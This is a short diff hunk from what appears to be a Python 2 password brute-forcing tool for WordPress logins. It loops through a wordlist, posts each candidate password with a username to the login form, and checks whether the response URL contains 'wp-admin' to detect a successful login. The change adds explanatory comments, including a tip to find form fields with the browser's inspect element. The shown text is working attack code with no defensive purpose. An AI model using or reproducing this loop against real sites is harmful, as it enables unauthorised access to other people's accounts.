@@ -36,12 +36,12 @@ wordlist = open(args.wordlist, 'r')	# opening a wordlist
 passwords = wordlist.readlines()	# read lines
 for password in passwords:		# making a loop
 	password = password.strip()	# reading lines one by one 
-	values = { 'log': user_login, 'pwd': password }
+	values = { 'log': user_login, 'pwd': password }	# use inspect element in your browser if u have no idea
 	data = urllib.urlencode(values)
 	request = urllib2.Request(url, data)
 	response = urllib2.urlopen(request)
 	try:
-		idx = response.geturl().index('wp-admin')
+		idx = response.geturl().index('wp-admin') # when u sccessfully logged in the url will be http:/server/wp-admin
 	except:
 		idx = 0
 	if idx > 0: #(6)
